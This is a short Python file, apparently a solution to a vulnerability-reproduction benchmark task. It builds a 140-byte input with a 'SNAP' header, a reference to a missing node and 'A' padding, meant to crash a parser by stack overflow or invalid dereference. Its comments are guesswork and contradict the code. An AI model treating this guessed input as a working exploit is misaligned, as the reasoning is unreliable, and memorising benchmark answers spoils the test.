class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth PoC length: 140 bytes
        # Crafted to reference non-existent node ID, triggering invalid dereference
        # Format assumption: simple binary structure - header + nodes + references
        # Header: 4 bytes magic, 4 bytes num_nodes, 4 bytes num_refs
        # Nodes: each 8 bytes (ID + data ptr or size)
        # Refs: each 4 bytes node ID
        # To trigger: num_nodes=0, num_refs=1, ref to ID=1 (non-existent)
        # But to cause stack overflow, perhaps oversized num_nodes leading to loop overflow
        # Assuming stack buffer for node data, overflow by large num_nodes and small data
        poc = b''
        poc += b'SNAP'  # magic 4 bytes
        poc += b'\x00\x00\x00\x01'  # num_nodes = 1
        poc += b'\x41\x42\x43\x44\x45\x46\x47\x48'  # node 0 data (8 bytes, but if buffer smaller, overflow)
        poc += b'\x00\x00\x00\x01'  # num_refs = 1
        poc += b'\x00\x00\x00\x02'  # ref to node ID 2 (non-existent)
        # Pad to 140 bytes with filler to potentially overflow stack buffer in parsing
        poc += b'A' * (140 - len(poc))
        return poc